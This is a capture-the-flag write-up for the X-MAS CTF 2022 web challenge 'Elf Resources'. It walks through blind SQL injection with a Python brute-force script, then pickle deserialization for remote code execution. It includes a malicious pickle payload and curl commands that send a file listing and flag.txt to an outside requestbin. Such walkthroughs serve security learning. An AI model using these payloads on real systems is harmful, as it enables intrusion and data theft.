---
title: "X-MAS CTF 2022"
categories: [Writeups]
layout: post 
---

# X-MAS CTF 2022 Writeups

## Team Placing: #17 / 816

## Categories
* ### Web
    * #### [Elf Resources](#challenge-elf-resources)

-------------------------------------------------------------------------------

### Challenge: Elf Resources
### Category: Web

## Description:

![](/assets/img/writeups/XMASCTF2022/elfresources.png)

## Walkthrough:

Navigating to the provided URL, we're presented with this page:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.001.jpg)

We can click on one of the elf buttons, such as Snowflake, and we're presented with another page containing the elf's name and what they're working on:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.002.png)

The path for each page is `/1`, `/2`, or `/3` depending on which elf button you click.

At first, I thought maybe there are additional elves that we can't see and changing this "id" value in the URL would show us hidden elves. So I tried navigating to `/0`:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.003.png)

Huh, we get a `500 Internal Server Error` instead of a `404 Not Found Error`. So this value is presumably being processed on the backend somehow.

Knowing this, I began to think this may be vulnerable to SQL injection. A quick test for `1 and 1=2` and `1 and 1=1` confirmed this:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.004.png)

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.005.png)

So presumably the SQL query is something along the lines of `SELECT * FROM elves WHERE id={path};`

Because we cannot see the results of the query or the error on the page, we're dealing with a blind SQL injection vulnerability; specifically blind error based SQL injection, because our only indication of whether or not the query was successful is based off if the server returns status code `200` or `500`.

I took a guess that the server was running SQLite which uses `CASE WHEN [conditional] THEN x ELSE y END` syntax instead of `IF()` syntax like MySQL uses.

A simple query to showcase this is: `1=(CASE WHEN true THEN 1 ELSE 2 END)`

- `1=` represents what we want to compare against what the CASE statement returns
- `CASE WHEN true` represents some conditional that is used by the CASE statement to determine which value to return
- `THEN 1` represents the value returned if the CASE statement conditional is true
- `ELSE 2` represents the value returned if the CASE statement conditional is false 
- `END` is a keyword to end the CASE statement

In the example above, since the conditional is simply set to `true`, a `1` is returned from the CASE statement which makes the overall query true since `1=1`

With this understanding, we can begin leaking information from the database. We'll do this by bruteforcing each character of the table names to find the table we're looking for, then we'll bruteforce the column names of that table, and finally we'll bruteforce the values within the columns we find.

To do this, I crafted a Python script:

```python
import string
import requests

# String to store our leaked data in
leaked_data = ''

# Continually loop
while True:

    # for each character we want to bruteforce
    for l in ('_=' + string.ascii_letters + string.digits + "!@#$%^()@{}"):

        # position variable to store the index of the character we're bruteforcing
        position = len(leaked_data) + 1 # + 1 because we want to leak the next character

        # The SQL query
        sql = f"1 and 1=(CASE WHEN (SELECT SUBSTR(name,{position},1) FROM sqlite_master WHERE type='table' and name NOT like 'sqlite_%')='{l}' THEN 1 ELSE 2 END)"

        # Send our payload
        r = requests.get("http://challs.htsp.ro:13001/" + sql)

        print(f'trying {leaked_data + l}')

        # If the server returns 500, we know the character is wrong
        if r.status_code == 500:
            print('bad')
            continue
        else: # Otherwise, if it returned 200 we know the character is correct
            print('good')
            leaked_data += l # append this character to our leaked data
            break # break to begin bruteforcing the next character
```

I have added comments to explain the code but I will explain the SQL query:

```sql
1 and 1=(CASE WHEN (SELECT SUBSTR(name,{position},1) FROM sqlite_master WHERE type='table' and name NOT like 'sqlite_%')='{l}' THEN 1 ELSE 2 END)"
```

We begin the query like I've explained above `1 and 1=` and then a CASE statement. The conditional for the CASE statement is where the bruteforcing is occurring:

```sql
SELECT SUBSTR(name,{position},1) FROM sqlite_master WHERE type='table' and name NOT like 'sqlite_%'='{l}'
```

Essentially, we're grabbing a single character at index `position` from the `name` column of the `sqlite_master` table where the `type` is a `table` and the `name` does not begin with `sqlite_`. We then compare this character to `l` which is the variable containing the current letter of the string of characters we're iterating through in the script.

When this selection equals `l`, the query is true and our CASE statement returns `1` which makes our query look like `1 and 1=1` thus returning the page like normal. This means we've successfully leaked the character at that index so we can increment the `position` variable and begin bruteforcing the next character.

Running the script we successfully leak the `elves` table:

```
...
trying elvep
bad
trying elveq
bad
trying elver
bad
trying elves
good
```

We can add additional `and name NOT like` statements to ensure we leak all of the tables, but in this case `elves` was the only table.

Now we need to leak the column names. The query for this looks like so:

```sql
1 and 1=(CASE WHEN (SELECT SUBSTR(c.name,{position},1) FROM pragma_table_info('elves') c WHERE c.name NOT like 'id%' and c.name NOT like 'data%')='{l}' THEN 1 ELSE 2 END)"
```

The only difference here is we're using the `pragma_table_info` function to access the column names of the `elves` table we leaked before. The `c.name NOT like` statements were added as I leaked all of the column names. In this case, I was able to leak the `id` and `data` columns.

Great, now we can start leaking the values out of the data column. The final query looks like this:

```sql
1 and 1=(CASE WHEN (SELECT unicode(SUBSTR(data,{position},1)) FROM elves WHERE id=1)={ord(l)} THEN 1 ELSE 2 END)"
```

One thing to note is that I was unable to get the `data` values to leak as simply characters. I had to modify the query to use the `unicode` function which converts a character to its ASCII decimal representation (i.e., 'A' == 65 decimal). I'm not exactly sure why this was the case, but I learned about the `unicode` function in the process of struggling with it so that's a plus in my book.

After running the script for each `id`, this is what we leaked:

```
gASVUAAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwJU25vd2ZsYWtllIwIYWN0aXZpdHmUjA1QYWNraW5nIGdpZnRzlIwCaWSUTnViLg==
gASVSwAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwEQmVsbJSMCGFjdGl2aXR5lIwNSGVscGluZyBTYW50YZSMAmlklE51Yi4=
gASVWgAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFU25vd3mUjAhhY3Rpdml0eZSMG0xvb2tpbmcgYXQgdGhlIG5hdWdodHkgbGlzdJSMAmlklE51Yi4=
```

These look like Base64 strings, so we can try converting one:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.006.png)

It appears to be some serialized data, and from experience it looks like a [Python pickle object](https://docs.python.org/3/library/pickle.html).

Knowing this, let's try to craft our own pickle object and see if we can get the server to unpickle it. I crafted this script which will create our own `Elf` object:

```python
import pickle 
import os
import base64

class Elf:
    def __init__(self, name, activity, id):
        self.name = name
        self.activity = activity
        self.id = id

print(base64.b64encode(pickle.dumps(Elf('ducky','hacking the planet','1337'))))
```

Running the script, we generate our Base64 encoded pickle object:

```
gASVVwAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFZHVja3mUjAhhY3Rpdml0eZSMEmhhY2tpbmcgdGhlIHBsYW5ldJSMAmlklIwEMTMzN5R1Yi4=
```

Now we need to figure out how to get the server to unpickle this. After some messing around with the SQL, I was able to get the server to unpickle the data by providing this SQL query: `1 UNION SELECT "gASVVwAAAAAAAACMCF9fbWFpbl9flIwDRWxmlJOUKYGUfZQojARuYW1llIwFZHVja3mUjAhhY3Rpdml0eZSMEmhhY2tpbmcgdGhlIHBsYW5ldJSMAmlklIwEMTMzN5R1Yi4="`:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.007.jpg)

Great! Now we need to figure out how to exploit this.

I am familiar with a [vulnerability](https://book.hacktricks.xyz/pentesting-web/deserialization#pickle) which allows for remote code execution when a server "unpickles" untrusted data so let's try crafting a malicious pickle:

```python
import pickle 
import os
import base64

class Elf:

    def __reduce__(self):
        return(os.system,("curl https://eo5ms17xjgmwn5k.m.pipedream.net",))

print(base64.b64encode(pickle.dumps(Elf())))
```

Running the script prints our malicious pickle in Base64:

```
gASVWwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjEBjdXJsIC1GIGZsYWc9QC4vZmxhZy50eHQgaHR0cHM6Ly9lb2hpejUzMm9lM2YxaHYubS5waXBlZHJlYW0ubmV0lIWUUpQu
```

Whenever the server unpickles this data, the `__reduce__` function will execute allowing us to get remote code execution. The payload above makes a simple HTTP request to a [requestbin](https://requestbin.com/) I created which will allow me to inspect the requests.

Sending the SQL payload like before but with our malicious pickle doesn't show anything on the page:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.008.jpg)

But if we go back to our requestbin page we can see the HTTP request from the curl command:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.009.png)

Nice! Since we only have blind execution, we need to get a little creative in order to do things like read files. Luckily, we can send files as POST requests using curl so we can do something like this:

```bash
ls > /tmp/uwu; curl -F flag=@/tmp/uwu https://eo5ms17xjgmwn5k.m.pipedream.net
```

Changing our script to use this command, we generate a new Base64 payload. And then sending this payload, we get a POST request back at our requestbin:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.010.png)

The long s3 link is how requestbin stores these files. Navigating to the link we can download the `uwu` file which looks like so:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.011.png)

Nice, it looks like the `flag.txt` file is in our current directory. So we can just change the payload like so to get the flag:

```
curl -F flag=@flag.txt https://eo5ms17xjgmwn5k.m.pipedream.net
```

Sending our payload, we get the flag.txt file:

![](/assets/img/writeups/XMASCTF2022/Elf%20Resources%20Writeup.012.png)

### Flag: X-MAS{3Lf_HuM4n_R350urC35_w1lL_83_C0n74C71N9_Y0u_500n}
